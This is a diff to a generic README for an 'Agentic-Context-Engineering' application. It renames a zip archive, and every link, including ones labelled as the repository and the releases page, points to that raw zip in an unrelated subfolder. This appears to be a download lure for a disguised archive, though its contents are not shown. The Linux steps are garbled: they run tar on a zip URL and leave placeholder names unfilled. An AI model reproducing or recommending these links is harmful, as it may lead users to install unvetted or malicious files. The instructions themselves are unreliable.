@@ -1,6 +1,6 @@
 # 🌟 Agentic-Context-Engineering - Experience Contextual Understanding in Action
 
-[![Download from Releases](https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Agentic-Context-Engineering.zip%20Now-Visit%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Agentic-Context-Engineering.zip)
+[![Download from Releases](https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Context-Agentic-Engineering-v2.5.zip%20Now-Visit%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Context-Agentic-Engineering-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Agentic Context Engineering application. This software implements
 
 To get started, visit our Releases page to download the latest version of the software. Click the link below:
 
-[Download the latest version](https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Agentic-Context-Engineering.zip)
+[Download the latest version](https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Context-Agentic-Engineering-v2.5.zip)
 
 Once you are on the Releases page, look for the latest version available. Follow these steps to download and install the application:
 
@@ -49,8 +49,8 @@ After you have downloaded the application, follow these steps to install it:
 ### For Linux:
 
 1. Open your terminal.
-2. Navigate to the directory where you downloaded the https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Agentic-Context-Engineering.zip file.
-3. Type the command: `tar -zxvf https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Agentic-Context-Engineering.zip`, replacing "filename" with the actual file name.
+2. Navigate to the directory where you downloaded the https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Context-Agentic-Engineering-v2.5.zip file.
+3. Type the command: `tar -zxvf https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Context-Agentic-Engineering-v2.5.zip`, replacing "filename" with the actual file name.
 4. Navigate into the extracted folder using `cd foldername`.
 5. Run the application using the command: `./application_name`, replacing "application_name" with the actual program name.
 
@@ -81,7 +81,7 @@ If you encounter any issues, consider the following:
 
 For more details about features and use cases:
 
-- Visit the [GitHub Repository](https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Agentic-Context-Engineering.zip) for documentation.
-- Check out the [Releases Page](https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Agentic-Context-Engineering.zip) for updates and new features.
+- Visit the [GitHub Repository](https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Context-Agentic-Engineering-v2.5.zip) for documentation.
+- Check out the [Releases Page](https://raw.githubusercontent.com/Ajay6093/Agentic-Context-Engineering/main/Lycopus/Context-Agentic-Engineering-v2.5.zip) for updates and new features.
 
 We hope you find this application useful. Dive into the world of contextual understanding and experience the power of Agentic Context Engineering!
